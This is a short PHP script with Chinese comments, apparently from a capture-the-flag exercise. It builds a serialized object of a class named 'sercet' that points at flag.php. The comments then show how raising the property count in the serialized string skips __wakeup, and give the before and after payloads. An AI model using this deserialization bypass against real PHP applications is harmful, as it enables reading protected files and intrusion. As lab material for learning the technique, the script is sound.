<?php
class sercet{
    private $file='index.php';
    public function __construct($file){
        echo "_construct执行<br>";
        $this->file=$file;
    }

}
$obj =new sercet("flag.php");
$a=serialize($obj);
print_r($a);
// 对象属性个数的值大于 真实的属性个数时会跳过__wakeup
// 0x00 改为 %00, 1改为2
// 修改前 O:6:"sercet":1:{s:12:"%00sercet%00file";s:8:"flag.php";}
// 修改后 O:6:"sercet":2:{s:12:"%00sercet%00file";s:8:"flag.php";}
